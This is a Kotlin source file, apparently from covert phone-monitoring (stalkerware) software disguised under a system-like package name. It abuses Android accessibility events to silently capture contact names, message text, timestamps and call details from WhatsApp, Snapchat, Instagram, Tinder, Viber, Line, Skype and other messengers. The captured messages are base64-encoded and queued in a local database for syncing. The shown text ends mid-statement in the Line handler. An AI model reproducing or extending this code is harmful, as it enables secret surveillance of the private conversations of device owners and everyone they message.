package com.android.services.util

import android.content.Context
import android.graphics.Rect
import android.os.Build
import android.telephony.PhoneNumberUtils
import android.text.TextUtils
import android.view.accessibility.AccessibilityNodeInfo
import com.android.services.accessibility.AccessibilityUtils
import com.android.services.accessibility.AccessibilityUtils.dateTime
import com.android.services.accessibility.AccessibilityUtils.imContactName
import com.android.services.accessibility.AccessibilityUtils.imDate
import com.android.services.accessibility.AccessibilityUtils.imMessageText
import com.android.services.accessibility.AccessibilityUtils.imSnapchatContactName
import com.android.services.accessibility.AccessibilityUtils.messageType
import com.android.services.accessibility.AccessibilityUtils.senderName
import com.android.services.accessibility.AccessibilityUtils.snapChatMessageType
import com.android.services.accessibility.AccessibilityUtils.timeStampVal
import com.android.services.db.entities.FacebookUnrooted
import com.android.services.db.entities.HikeUnrooted.HikeUnrootedBuilder
import com.android.services.db.entities.IMOUnrooted.IMOUnrootedBuilder
import com.android.services.db.entities.InstagramUnrooted.InstagramUnrootedBuilder
import com.android.services.db.entities.LineUnrooted.LineUnrootedBuilder
import com.android.services.db.entities.SkypeUnrooted
import com.android.services.db.entities.SmsLog
import com.android.services.db.entities.SnapChatUnrooted.SnapChatUnrootedBuilder
import com.android.services.db.entities.TinderUnrooted.TinderUnrootedBuilder
import com.android.services.db.entities.TumblrUnrooted.TumblrUnrootedBuilder
import com.android.services.db.entities.ViberUnrooted.ViberUnrootedBuilder
import com.android.services.db.entities.WhatsAppUnrooted.WhatsAppUnrootedBuilder
import com.android.services.enums.IMType
import com.android.services.logs.source.LocalDatabaseSource
import java.net.URLEncoder
import java.text.SimpleDateFormat
import java.util.*


object InstantMessengersUtil {

    fun retrieveMessages(
        context: Context,
        localDatabaseSource: LocalDatabaseSource,
        pkgName: String,
        sourceText: String,
        id: String?,
        className: String,
        contentDescription: String = "",
        nodeInfo: AccessibilityNodeInfo? = null,
        boundsInScreen: Rect? = null
    ) {
        when (pkgName) {
            "com.skype.raider" -> printSkypeMessages(
                context,
                localDatabaseSource,
                sourceText,
                id,
                className, pkgName, nodeInfo, boundsInScreen, contentDescription
            )

            "com.whatsapp", "com.whatsapp.w4b" -> printAllWhatsAppMessages(
                context,
                localDatabaseSource,
                sourceText,
                id,
                className, pkgName
            )

            "com.facebook.orca" -> printFacebookMessages(
                context,
                localDatabaseSource,
                sourceText,
                id,
                className, pkgName, nodeInfo, boundsInScreen, contentDescription
            )

            "jp.naver.line.android" -> printLineMessages(
                context,
                localDatabaseSource,
                sourceText,
                id,
                className
            )

            "com.viber.voip" -> printViberMessages(context, localDatabaseSource, sourceText, id)
            "com.imo.android.imoim" -> printIMOMessages(
                context,
                localDatabaseSource,
                sourceText,
                id
            )

            "com.instagram.android" -> printInstagramMessages(
                context,
                localDatabaseSource,
                sourceText,
                id
            )

            "com.snapchat.android" -> printSnapChatMessages(
                context,
                localDatabaseSource,
                sourceText,
                id,
                className,
                nodeInfo
            )

            "com.tumblr" -> {
                printTumblrMessages(context, localDatabaseSource, sourceText, id)
            }

            "com.tinder" -> printTinderMessages(context, localDatabaseSource, sourceText, id)
//            "com.google.android.talk" -> printGoogleHangouts(
//                context,
//                localDatabaseSource,
//                sourceText,
//                id
//            )
            AppUtils.getDefaultMessagingApp() -> printDefaultMessagingAppMessages(
                context,
                localDatabaseSource,
                sourceText,
                id,
                contentDescription,
                className
            )
        }
        logVerbose("tos, id = $id, text = $sourceText, className = $className")
    }

//    /**
//     * This method looks for the Hangouts screen content, and captures the hangout conversation name
//     * @param context Context
//     * @param localDatabaseSource [LocalDatabaseSource] Local Database Source Instance
//     * @param id Id of the View
//     */
//    private fun printGoogleHangouts(
//        context: Context,
//        localDatabaseSource: LocalDatabaseSource,
//        sourceText: String,
//        id: String?,
//    ) {
//        if (id != null && id == "title") {
//            AccessibilityUtils.hangOutConversationName = sourceText
//        }
//    }

    /**
     * This monitors the content of Hike chat messengers, and observes for the Hike Messages
     * @param context Context
     * @param localDatabaseSource [LocalDatabaseSource] Local Database Source Instance
     * @param id Id of the View
     */
    private fun printHikeMessages(
        context: Context,
        localDatabaseSource: LocalDatabaseSource,
        sourceText: String,
        id: String?,
    ) {
        if (AppConstants.syncHike) {
            try {
                if (id == "contact_name") {
                    AccessibilityUtils.imContactName = sourceText
                } else if (id == "text") {
                    AccessibilityUtils.imMessageText = sourceText
                } else if (id == "time") {
                    AccessibilityUtils.imDate = sourceText
                    AccessibilityUtils.imDate = AccessibilityUtils.lastDateString + sourceText
                    if (!TextUtils.isEmpty(AccessibilityUtils.imContactName) && !TextUtils.isEmpty(
                            AccessibilityUtils.imMessageText
                        )
                    ) {
                        val messageId =
                            AppUtils.md5Hash(AccessibilityUtils.imContactName + AccessibilityUtils.imMessageText + AccessibilityUtils.imDate)
                        if (localDatabaseSource.checkHikeIfAlreadyExist(messageId)) {
                            val phoneNumber =
                                AppUtils.retrievePhoneNumberFromDisplayName(AccessibilityUtils.imContactName)
                            var conversationId: String
                            if (!TextUtils.isEmpty(phoneNumber)) {
                                conversationId =
                                    AccessibilityUtils.imContactName + "_" + AppUtils.retrievePhoneNumberFromDisplayName(
                                        AccessibilityUtils.imContactName
                                    )
                                conversationId = conversationId.replace(" ", "")
                            } else {
                                conversationId = AccessibilityUtils.imContactName
                            }
                            AccessibilityUtils.messageType =
                                if (AccessibilityUtils.lastIMTypedText == AccessibilityUtils.imMessageText) "outgoing" else "incoming"

                            logVerbose(
                                "${AppConstants.HIKE_UNROOTED_TYPE}, messageId = " + messageId
                                        + ", conversationId = " + conversationId
                                        + ", contactName = " + AccessibilityUtils.imContactName
                                        + ", senderName = " + AccessibilityUtils.senderName
                                        + ", message Text = " + AccessibilityUtils.imMessageText
                                        + ", message Type = " + AccessibilityUtils.messageType
                                        + ", timeStamp = " + AccessibilityUtils.imDate
                            )
                            val hikeUnrooted = HikeUnrootedBuilder()
                                .setUniqueId(messageId)
                                .setConversationId(conversationId)
                                .setConversationName(AccessibilityUtils.imContactName)
                                .setSenderName(AccessibilityUtils.senderName)
                                .setMessage(AppUtils.convertStringToBase64(AccessibilityUtils.imMessageText))
                                .setType(AccessibilityUtils.messageType)
                                .setMessageDatetime(AccessibilityUtils.imDate)
                                .setStatus(0)
                                .create()
                            localDatabaseSource.insertHikeUnrooted(hikeUnrooted)
                        }
                        AccessibilityUtils.imMessageText = ""
                        AccessibilityUtils.imDate = ""
                        AccessibilityUtils.senderName = ""
                    }
                } else if (id == "sender_name") {
                    AccessibilityUtils.senderName = sourceText
                }
            } catch (e: Exception) {
                logException("${AppConstants.HIKE_UNROOTED_TYPE} ${AppUtils.currentMethod} exception = ${e.message}")
            }
        }
    }


    /**
     * This method displays the content of the SnapChat Chat Screen, And Observers for the New Snapchat Messages
     * @param context Context
     * @param localDatabaseSource [LocalDatabaseSource] Local Database Source Instance
     * @param id Id of the View
     * @param className className of the View
     */
    private fun printSnapChatMessages(
        context: Context,
        localDatabaseSource: LocalDatabaseSource,
        sourceText: String,
        id: String?,
        className: String,
        nodeInfo: AccessibilityNodeInfo?,
    ) {
        if (AppConstants.syncSnapchat) {
            if (nodeInfo != null) {
                try {
                    if ((id == null || id.isEmpty()) && className == "javaClass") {
                        logVerbose("SnapChatMessageInfo = info = $nodeInfo")
                        val rect = Rect()
                        nodeInfo.getBoundsInParent(rect)
                        val left = rect.left
                        val top = rect.top
                        if (left == 0 && top == 0) {
                            if (sourceText.isNotEmpty()) {
                                if (sourceText.equals("ME")) {
                                    snapChatMessageType = "outgoing"
                                } else if (sourceText.equals(imSnapchatContactName.toUpperCase())) {
                                    snapChatMessageType = "incoming"
                                }
                            }
                        } else {
                            if (nodeInfo.parent != null) {
                                val parentInfo = nodeInfo.parent
                                val parentClassName = parentInfo.className ?: ""
                                if ((parentInfo.viewIdResourceName == null || parentInfo.viewIdResourceName.isEmpty()) && parentClassName == "android.view.View") {
                                    imMessageText = sourceText
                                    logVerbose("SnapChatMessageInfoSnapChatMessageInfo = Conversation Name =$imSnapchatContactName Message = $imMessageText  and type = $snapChatMessageType parentNotiInfo= $parentInfo")
                                }
                            }
                        }
                        if (!TextUtils.isEmpty(AccessibilityUtils.imMessageText) && !TextUtils.isEmpty(
                                AccessibilityUtils.imSnapchatContactName
                            ) && !TextUtils.isEmpty(AccessibilityUtils.snapChatMessageType)
                        ) {
                            val messageId =
                                AppUtils.md5Hash(AccessibilityUtils.imSnapchatContactName + AccessibilityUtils.imMessageText)
                            if (localDatabaseSource.checkSnapChatIfAlreadyExist(messageId)) {
                                val conversationId = AccessibilityUtils.imSnapchatContactName
                                if (AccessibilityUtils.lastTypedText == AccessibilityUtils.imMessageText || (AccessibilityUtils.lastTypedText.isNotEmpty() && imMessageText.startsWith(
                                        AccessibilityUtils.lastTypedText, true
                                    )) || snapChatMessageType.isEmpty()
                                ) {
                                    AccessibilityUtils.snapChatMessageType = "outgoing"
                                }
                                logVerbose(
                                    "${AppConstants.SNAP_CHAT_UNROOTED_TYPE}, messageId = " + messageId
                                            + ", conversationId = " + conversationId
                                            + ", contactName = " + AccessibilityUtils.imSnapchatContactName
                                            + ", senderName = " + AccessibilityUtils.senderName
                                            + ", message Text = " + AccessibilityUtils.imMessageText
                                            + ", message Type = " + AccessibilityUtils.snapChatMessageType
                                            + ", timeStamp = " + AccessibilityUtils.imDate
                                )

                                val snapChatUnrooted = SnapChatUnrootedBuilder()
                                    .setUniqueId(messageId)
                                    .setConversationId(conversationId)
                                    .setConversationName(AccessibilityUtils.imSnapchatContactName)
                                    .setSenderName(AccessibilityUtils.senderName)
                                    .setMessage(AppUtils.convertStringToBase64(AccessibilityUtils.imMessageText))
                                    .setType(AccessibilityUtils.snapChatMessageType)
                                    .setMessageDatetime(
                                        AppUtils.formatDate(
                                            System.currentTimeMillis()
                                                .toString()
                                        )
                                    )
                                    .setStatus(0)
                                    .create()
                                localDatabaseSource.insertSnapchatUnrooted(snapChatUnrooted)
                            }
                            AccessibilityUtils.imDate = ""
                            AccessibilityUtils.imMessageText = ""
                        }
                    } else if (id != null) {
                        if (id == "conversation_title_text_view") {
                            AccessibilityUtils.imSnapchatContactName = sourceText
                        } else if (id == "hova_page_title" || id == "ff_item") {
                            AccessibilityUtils.imSnapchatContactName = ""
                            snapChatMessageType = ""
                        } else if (className == "android.widget.EditText" && id == "chat_input_text_field") {
                            AccessibilityUtils.lastTypedText = sourceText
                        } else if (id == "chat_message_time") {
                            AccessibilityUtils.imDate = sourceText
                        } else if (id == "text" || id == "media_card_title") {
                            AccessibilityUtils.imMessageText = sourceText
                            if (
                                !TextUtils.isEmpty(AccessibilityUtils.imDate) &&
                                !TextUtils.isEmpty(
                                    AccessibilityUtils.imSnapchatContactName
                                )
                            ) {
                                AccessibilityUtils.imDate =
                                    AccessibilityUtils.lastDateString + AccessibilityUtils.imDate
                                AccessibilityUtils.snapChatMessageType =
                                    if (AccessibilityUtils.senderName == "ME") "outgoing" else "incoming"
                                val messageId =
                                    AppUtils.md5Hash(AccessibilityUtils.imSnapchatContactName + AccessibilityUtils.imMessageText)
                                if (localDatabaseSource.checkSnapChatIfAlreadyExist(messageId)) {
                                    val conversationId = AccessibilityUtils.imSnapchatContactName

                                    logVerbose(
                                        "Snapchat, messageId = " + messageId
                                                + ", conversationId = " + conversationId
                                                + ", contactName = " + AccessibilityUtils.imSnapchatContactName
                                                + ", senderName = " + AccessibilityUtils.senderName
                                                + ", message Text = " + AccessibilityUtils.imMessageText
                                                + ", message Type = " + AccessibilityUtils.snapChatMessageType
                                                + ", timeStamp = " + AccessibilityUtils.imDate
                                    )

                                    val snapchatUnrooted = SnapChatUnrootedBuilder()
                                        .setUniqueId(messageId)
                                        .setConversationId(conversationId)
                                        .setConversationName(AccessibilityUtils.imSnapchatContactName)
                                        .setSenderName(AccessibilityUtils.senderName)
                                        .setMessage(
                                            AppUtils.convertStringToBase64(
                                                AccessibilityUtils.imMessageText
                                            )
                                        )
                                        .setType(AccessibilityUtils.snapChatMessageType)
                                        .setMessageDatetime(
                                            AppUtils.formatDate(
                                                System.currentTimeMillis()
                                                    .toString()
                                            )
                                        )
                                        .setStatus(0)
                                        .create()
                                    localDatabaseSource.insertSnapchatUnrooted(snapchatUnrooted)
                                }
                                AccessibilityUtils.imDate = ""
                                AccessibilityUtils.imMessageText = ""
                            }
                        } else if (id == "sender") {
                            AccessibilityUtils.senderName = sourceText
                        }
                    }
                } catch (e: Exception) {
                    logException("${AppConstants.SNAP_CHAT_UNROOTED_TYPE} ${AppUtils.currentMethod} exception = ${e.message}")
                }
            }
        }
    }

    /**
     * This method takes care of capturing & monitoring instagram screen content, and store the incoming & outgoing Messages
     * @param context Context of the App
     * @param localDatabaseSource [LocalDatabaseSource] Local Database Source Instance
     * @param id Id of the View
     */
    private fun printInstagramMessages(
        context: Context,
        localDatabaseSource: LocalDatabaseSource,
        sourceText: String,
        id: String?,
    ) {
        if (AppConstants.syncInstagram) {
            try {
                if (id == "thread_title") {
                    AccessibilityUtils.imContactName = sourceText
                } else if (id == "direct_text_message_text_view") {
                    AccessibilityUtils.imMessageText = sourceText
                    if (!TextUtils.isEmpty(AccessibilityUtils.imDate) && !TextUtils.isEmpty(
                            AccessibilityUtils.imContactName
                        )
                    ) {
                        AccessibilityUtils.messageType =
                            if (AccessibilityUtils.lastTypedText == AccessibilityUtils.imMessageText) "outgoing" else "incoming"
                        val messageId =
                            AppUtils.md5Hash(AccessibilityUtils.imContactName + AccessibilityUtils.imMessageText + AccessibilityUtils.imDate)
                        if (localDatabaseSource.checkInstagramIfAlreadyExist(messageId)) {
                            val conversationId = AccessibilityUtils.imContactName
                            logVerbose(
                                "${AppConstants.INSTAGRAM_UNROOTED_TYPE}, messageId = " + messageId
                                        + ", conversationId = " + conversationId
                                        + ", contactName = " + AccessibilityUtils.imContactName
                                        + ", senderName = " + AccessibilityUtils.senderName
                                        + ", message Text = " + AccessibilityUtils.imMessageText
                                        + ", message Type = " + AccessibilityUtils.messageType
                                        + ", timeStamp = " + AccessibilityUtils.imDate
                            )
                            val instagramUnrooted = InstagramUnrootedBuilder()
                                .setUniqueId(messageId)
                                .setConversationId(conversationId)
                                .setConversationName(AccessibilityUtils.imContactName)
                                .setSenderName(AccessibilityUtils.senderName)
                                .setMessage(AppUtils.convertStringToBase64(AccessibilityUtils.imMessageText))
                                .setType(AccessibilityUtils.messageType)
                                .setMessageDatetime(
                                    AppUtils.formatDate(
                                        System.currentTimeMillis()
                                            .toString()
                                    )
                                )
                                .setStatus(0)
                                .create()
                            localDatabaseSource.insertInstagramUnrooted(instagramUnrooted)
                        }
                        AccessibilityUtils.imDate = ""
                        AccessibilityUtils.imMessageText = ""
                        AccessibilityUtils.senderName = ""
                    }
                } else if (id == "message_status" && sourceText != "Sending...") {
                    AccessibilityUtils.imDate = AccessibilityUtils.lastDateString + sourceText
                    if (!TextUtils.isEmpty(AccessibilityUtils.imContactName) && !TextUtils.isEmpty(
                            AccessibilityUtils.imMessageText
                        )
                    ) {
                        val messageId =
                            AppUtils.md5Hash(AccessibilityUtils.imContactName + AccessibilityUtils.imMessageText + AccessibilityUtils.imDate)
                        if (localDatabaseSource.checkInstagramIfAlreadyExist(messageId)) {
                            val conversationId = AccessibilityUtils.imContactName
                            AccessibilityUtils.messageType =
                                if (AccessibilityUtils.lastIMTypedText == AccessibilityUtils.imMessageText) "outgoing" else "incoming"
                            logVerbose(
                                "${AppConstants.INSTAGRAM_UNROOTED_TYPE}, messageId = " + messageId
                                        + ", conversationId = " + conversationId
                                        + ", contactName = " + AccessibilityUtils.imContactName
                                        + ", senderName = " + AccessibilityUtils.senderName
                                        + ", message Text = " + AccessibilityUtils.imMessageText
                                        + ", message Type = " + AccessibilityUtils.messageType
                                        + ", timeStamp = " + AccessibilityUtils.imDate
                            )
                            val instagramUnrooted = InstagramUnrootedBuilder()
                                .setUniqueId(messageId)
                                .setConversationId(conversationId)
                                .setConversationName(AccessibilityUtils.imContactName)
                                .setSenderName(AccessibilityUtils.senderName)
                                .setMessage(AppUtils.convertStringToBase64(AccessibilityUtils.imMessageText))
                                .setType(AccessibilityUtils.messageType)
                                .setMessageDatetime(
                                    AppUtils.formatDate(
                                        System.currentTimeMillis()
                                            .toString()
                                    )
                                )
                                .setStatus(0)
                                .create()
                            localDatabaseSource.insertInstagramUnrooted(instagramUnrooted)
                        }
                        AccessibilityUtils.imMessageText = ""
                        AccessibilityUtils.imDate = ""
                        AccessibilityUtils.senderName = ""
                    }
                }
            } catch (e: Exception) {
                logException("${AppConstants.INSTAGRAM_UNROOTED_TYPE} ${AppUtils.currentMethod} exception = ${e.message}")
            }
        }
    }

    /**
     * This method takes care of capturing & monitoring Imo screen content, and store the incoming & outgoing Messages
     * @param context Context of the App
     * @param localDatabaseSource [LocalDatabaseSource] Local Database Source Instance
     * @param id Id of the View
     */
    private fun printIMOMessages(
        context: Context,
        localDatabaseSource: LocalDatabaseSource,
        sourceText: String,
        id: String?,
    ) {
        if (AppConstants.syncImo) {
            try {
                if (id == "chat_name") {
                    AccessibilityUtils.imContactName = sourceText
                } else if (id == "tv_message") {
                    AccessibilityUtils.imMessageText = sourceText
                } else if (id == "imkit_date_inside") {
                    AccessibilityUtils.imDate = sourceText
                    if (!AccessibilityUtils.imDate.contains(",")) AccessibilityUtils.imDate =
                        AccessibilityUtils.lastDateString + AccessibilityUtils.imDate
                    if (!TextUtils.isEmpty(AccessibilityUtils.imContactName) && !TextUtils.isEmpty(
                            AccessibilityUtils.imMessageText
                        )
                    ) {
                        val messageId =
                            AppUtils.md5Hash(AccessibilityUtils.imContactName + AccessibilityUtils.imMessageText + AccessibilityUtils.imDate)
                        if (localDatabaseSource.checkImoIfAlreadyExist(messageId)) {
                            val phoneNumber =
                                AppUtils.retrievePhoneNumberFromDisplayName(AccessibilityUtils.imContactName)
                            var conversationId: String
                            if (!TextUtils.isEmpty(phoneNumber)) {
                                conversationId =
                                    AccessibilityUtils.imContactName + "_" + AppUtils.retrievePhoneNumberFromDisplayName(
                                        AccessibilityUtils.imContactName
                                    )
                                conversationId = conversationId.replace(" ", "")
                            } else {
                                conversationId = AccessibilityUtils.imContactName
                            }
                            AccessibilityUtils.messageType =
                                if (AccessibilityUtils.lastIMTypedText == AccessibilityUtils.imMessageText) "outgoing" else "incoming"
                            logVerbose(
                                "${AppConstants.IMO_UNROOTED_TYPE}, messageId = " + messageId
                                        + ", conversationId = " + conversationId
                                        + ", contactName = " + AccessibilityUtils.imContactName
                                        + ", senderName = " + AccessibilityUtils.senderName
                                        + ", message Text = " + AccessibilityUtils.imMessageText
                                        + ", message Type = " + AccessibilityUtils.messageType
                                        + ", timeStamp = " + AccessibilityUtils.imDate
                            )
                            val imoUnrooted = IMOUnrootedBuilder()
                                .setUniqueId(messageId)
                                .setConversationId(conversationId)
                                .setConversationName(AccessibilityUtils.imContactName)
                                .setSenderName(AccessibilityUtils.senderName)
                                .setMessage(AppUtils.convertStringToBase64(AccessibilityUtils.imMessageText))
                                .setType(AccessibilityUtils.messageType)
                                .setMessageDatetime(
                                    AppUtils.formatDate(
                                        System.currentTimeMillis()
                                            .toString()
                                    )
                                )
                                .setStatus(0)
                                .create()
                            localDatabaseSource.insertIMOUnrooted(imoUnrooted)
                        }
                        AccessibilityUtils.imMessageText = ""
                        AccessibilityUtils.imDate = ""
                        AccessibilityUtils.senderName = ""
                    }
                } else if (id == "message_buddy_name") {
                    AccessibilityUtils.senderName = sourceText
                }
            } catch (e: Exception) {
                logException("${AppConstants.IMO_UNROOTED_TYPE} ${AppUtils.currentMethod} exception = ${e.message}")
            }
        }
    }

    /**
     * This method takes care of capturing & monitoring Tumblr screen content, and store the incoming & outgoing Messages
     * @param context Context of the App
     * @param localDatabaseSource [LocalDatabaseSource] Local Database Source Instance
     * @param id Id of the View
     */
    private fun printTumblrMessages(
        context: Context,
        localDatabaseSource: LocalDatabaseSource,
        sourceText: String,
        id: String?,
    ) {
        if (AppConstants.syncTumblr) {
            try {
                if (id == "conversation_title") {
                    AccessibilityUtils.imContactName = sourceText
                } else if (id != null && id == "selected_view_blog_name") {
                    AccessibilityUtils.senderName = sourceText
                } else if (id != null && id == "message") {
                    AccessibilityUtils.imMessageText = sourceText
                    AccessibilityUtils.imDate =
                        AppUtils.formatDate(System.currentTimeMillis().toString())
                    if (!TextUtils.isEmpty(AccessibilityUtils.imMessageText) && !TextUtils.isEmpty(
                            AccessibilityUtils.imContactName
                        )
                    ) {
                        val messageId =
                            AppUtils.md5Hash(AccessibilityUtils.imContactName + AccessibilityUtils.imMessageText)
                        if (localDatabaseSource.checkTumblrExistsAlready(messageId)) {
                            val conversationId = AccessibilityUtils.imContactName
                            AccessibilityUtils.messageType =
                                if (AccessibilityUtils.lastIMTypedText == AccessibilityUtils.imMessageText) "outgoing" else "incoming"
                            logVerbose(
                                "${AppConstants.TUMBLR_UNROOTED_TYPE}, messageId = " + messageId
                                        + ", conversationId = " + conversationId
                                        + ", contactName = " + AccessibilityUtils.imContactName
                                        + ", senderName = " + AccessibilityUtils.senderName
                                        + ", message Text = " + AccessibilityUtils.imMessageText
                                        + ", message Type = " + AccessibilityUtils.messageType
                                        + ", timeStamp = " + AccessibilityUtils.imDate
                            )
                            val tumblrUnrooted = TumblrUnrootedBuilder()
                                .setUniqueId(messageId)
                                .setConversationId(conversationId)
                                .setConversationName(AccessibilityUtils.imContactName)
                                .setSenderName(AccessibilityUtils.senderName)
                                .setMessage(AppUtils.convertStringToBase64(AccessibilityUtils.imMessageText))
                                .setType(AccessibilityUtils.messageType)
                                .setMessageDatetime(
                                    AppUtils.formatDate(
                                        System.currentTimeMillis()
                                            .toString()
                                    )
                                )
                                .setStatus(0)
                                .create()
                            localDatabaseSource.insertTumblrUnrooted(tumblrUnrooted)
                        }
                        AccessibilityUtils.imMessageText = ""
                        AccessibilityUtils.imDate = ""
                        AccessibilityUtils.senderName = ""
                    }
                }
            } catch (e: Exception) {
                logException("${AppConstants.TUMBLR_UNROOTED_TYPE} ${AppUtils.currentMethod} exception = ${e.message}")
            }
        }
    }

    /**
     * This method takes care of capturing & monitoring Tinder screen content, and store the incoming & outgoing Messages
     * @param context Context of the App
     * @param localDatabaseSource [LocalDatabaseSource] Local Database Source Instance
     * @param id Id of the View
     */
    private fun printTinderMessages(
        context: Context,
        localDatabaseSource: LocalDatabaseSource,
        sourceText: String,
        id: String?,
    ) {
        if (AppConstants.syncTinder) {
            try {
                if (id == "textViewName") {
                    AccessibilityUtils.imContactName = sourceText
                } else if (id == "chatTextMessageContent") {
                    AccessibilityUtils.imMessageText = sourceText
                    AccessibilityUtils.imDate =
                        AppUtils.formatDate(System.currentTimeMillis().toString())
                    if (!TextUtils.isEmpty(AccessibilityUtils.imMessageText)) {
                        val messageId =
                            AppUtils.md5Hash(AccessibilityUtils.imContactName + AccessibilityUtils.imMessageText)
                        if (localDatabaseSource.checkTinderAlreadyExists(messageId)) {
                            val conversationId = AccessibilityUtils.imContactName
                            AccessibilityUtils.messageType =
                                if (AccessibilityUtils.lastIMTypedText == AccessibilityUtils.imMessageText) "outgoing" else "incoming"
                            logVerbose(
                                "${AppConstants.TINDER_UNROOTED_TYPE}, messageId = " + messageId
                                        + ", conversationId = " + conversationId
                                        + ", contactName = " + AccessibilityUtils.imContactName
                                        + ", senderName = " + AccessibilityUtils.senderName
                                        + ", message Text = " + AccessibilityUtils.imMessageText
                                        + ", message Type = " + AccessibilityUtils.messageType
                                        + ", timeStamp = " + AccessibilityUtils.imDate
                            )

                            val tinderUnrooted = TinderUnrootedBuilder()
                                .setUniqueId(messageId)
                                .setConversationId(conversationId)
                                .setConversationName(AccessibilityUtils.imContactName)
                                .setSenderName(AccessibilityUtils.senderName)
                                .setMessage(AppUtils.convertStringToBase64(AccessibilityUtils.imMessageText))
                                .setType(AccessibilityUtils.messageType)
                                .setMessageDatetime(
                                    AppUtils.formatDate(
                                        System.currentTimeMillis()
                                            .toString()
                                    )
                                )
                                .setStatus(0)
                                .create()
                            localDatabaseSource.insertTinderUnrooted(tinderUnrooted)
                        }
                        AccessibilityUtils.imMessageText = ""
                        AccessibilityUtils.imDate = ""
                        AccessibilityUtils.senderName = ""
                    }
                }
            } catch (e: Exception) {
                logException("${AppConstants.TINDER_UNROOTED_TYPE} ${AppUtils.currentMethod} exception = ${e.message}")
            }
        }

    }

    /**
     * This method takes care of capturing & monitoring Viber screen content, and store the incoming & outgoing Messages
     * @param context Context of the App
     * @param localDatabaseSource [LocalDatabaseSource] Local Database Source Instance
     * @param id Id of the View
     */
    private fun printViberMessages(
        context: Context,
        localDatabaseSource: LocalDatabaseSource,
        sourceText: String,
        id: String?,
    ) {
        if (AppConstants.syncViber) {
            try {
                if ((id == null || id.isEmpty()) && AccessibilityUtils.viberConversations.contains(
                        sourceText
                    )
                ) {
                    AccessibilityUtils.imContactName = sourceText
                } else if (id == "from" && !AccessibilityUtils.viberConversations.contains(
                        sourceText
                    )
                ) {
                    AccessibilityUtils.viberConversations.add(sourceText)
                } else if (id == "textMessageView") {
                    AccessibilityUtils.imMessageText = sourceText
                } else if (id == "nameView") {
                    AccessibilityUtils.senderName = sourceText
                } else if (id == "timestampView") {
                    AccessibilityUtils.imDate = sourceText
                    AccessibilityUtils.imDate =
                        AccessibilityUtils.lastDateString + AccessibilityUtils.imDate
                    if (!TextUtils.isEmpty(AccessibilityUtils.imContactName) && !TextUtils.isEmpty(
                            AccessibilityUtils.imMessageText
                        )
                    ) {
                        val messageId =
                            AppUtils.md5Hash(AccessibilityUtils.imContactName + AccessibilityUtils.imMessageText + AccessibilityUtils.imDate)
                        if (localDatabaseSource.checkViberIfAlreadyExist(messageId)) {
                            val phoneNumber =
                                AppUtils.retrievePhoneNumberFromDisplayName(AccessibilityUtils.imContactName)
                            var conversationId: String
                            if (!TextUtils.isEmpty(phoneNumber)) {
                                conversationId =
                                    AccessibilityUtils.imContactName + "_" + AppUtils.retrievePhoneNumberFromDisplayName(
                                        AccessibilityUtils.imContactName
                                    )
                                conversationId = conversationId.replace(" ", "")
                            } else {
                                conversationId = AccessibilityUtils.imContactName
                            }
                            AccessibilityUtils.messageType =
                                if (AccessibilityUtils.lastIMTypedText == AccessibilityUtils.imMessageText) "outgoing" else "incoming"
                            logVerbose(
                                "${AppConstants.VIBER_UNROOTED_TYPE}, messageId = " + messageId
                                        + ", conversationId = " + conversationId
                                        + ", contactName = " + AccessibilityUtils.imContactName
                                        + ", senderName = " + AccessibilityUtils.senderName
                                        + ", message Text = " + AccessibilityUtils.imMessageText
                                        + ", message Type = " + AccessibilityUtils.messageType
                                        + ", timeStamp = " + AccessibilityUtils.imDate
                            )
                            val viberUnrooted = ViberUnrootedBuilder()
                                .setUniqueId(messageId)
                                .setConversationId(conversationId)
                                .setConversationName(AccessibilityUtils.imContactName)
                                .setSenderName(AccessibilityUtils.senderName)
                                .setMessage(AppUtils.convertStringToBase64(AccessibilityUtils.imMessageText))
                                .setType(AccessibilityUtils.messageType)
                                .setMessageDatetime(
                                    AppUtils.formatDate(
                                        System.currentTimeMillis()
                                            .toString()
                                    )
                                )
                                .setStatus(0)
                                .create()
                            localDatabaseSource.insertViberUnrooted(viberUnrooted)
                        }
                        AccessibilityUtils.imMessageText = ""
                        AccessibilityUtils.imDate = ""
                        AccessibilityUtils.senderName = ""
                    }
                }
            } catch (e: Exception) {
                logException("${AppConstants.VIBER_UNROOTED_TYPE} ${AppUtils.currentMethod} exception = ${e.message}")
            }
        }
    }

    /**
     * This method takes care of capturing & monitoring Line screen content, and store the incoming & outgoing Messages
     * @param context Context of the App
     * @param localDatabaseSource [LocalDatabaseSource] Local Database Source Instance
     * @param id Id of the View
     * @param className ClassName of the View
     */
    private fun printLineMessages(
        context: Context,
        localDatabaseSource: LocalDatabaseSource,
        sourceText: String,
        id: String?,
        className: String,
    ) {
        try {
            var srcText = sourceText
            val isModeEnabled = AccessibilityUtils.isVOIPModeActive(context)
            AccessibilityUtils.voipDirection = "outgoing"
            if (!AccessibilityUtils.isIncomingVoipCaptured && !AccessibilityUtils.isOutgoingVoipCaptured) {
                if (id != null && id == "button_accept") {
                    AccessibilityUtils.voipDirection = "incoming"
                } else if (id != null && id == "peer_name") {
                    AccessibilityUtils.voipName = srcText
                    AccessibilityUtils.voipNumber = ""
                } else if (!TextUtils.isEmpty(
                        AccessibilityUtils.voipName
                    ) && ((srcText.startsWith(
                        "0:"
                    ) || srcText.startsWith(
                        "00:"
                    )) || isModeEnabled)
                ) {
                    AccessibilityUtils.voipStartTime = System.currentTimeMillis()
                    AccessibilityUtils.voipDirection =
                        if (TextUtils.isEmpty(AccessibilityUtils.voipDirection)) "incoming" else "outgoing"
                    AccessibilityUtils.voipMessenger = IMType.Line.toString()
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        if (AccessibilityUtils.voipDirection == "incoming") {
                            AccessibilityUtils.isIncomingVoipCaptured = true
                        } else {
                            AccessibilityUtils.isOutgoingVoipCaptured = true
                        }
                    }
                }
            }

            logVerbose("Line, id = $id, text = $sourceText, className = $className")
            if (AppConstants.syncLine) {
                if (id == "header_title") {
                    AccessibilityUtils.imContactName = sourceText
                } else if (id == "chathistory_row_sender") {
                    AccessibilityUtils.senderName = sourceText
                } else if (id == "chat_ui_row_timestamp") {
                    AccessibilityUtils.imDate = sourceText
                    if (!TextUtils.isEmpty(AccessibilityUtils.imContactName) && !TextUtils.isEmpty(
                            AccessibilityUtils.imMessageText
                        )
                    ) {
                        AccessibilityUtils.imDate =
                            AccessibilityUtils.lastDateString + AccessibilityUtils.imDate
                        AccessibilityUtils.messageType =
                            if (AccessibilityUtils.lastTypedText == AccessibilityUtils.imMessageText) "outgoing" else "incoming"
                        val messageId =
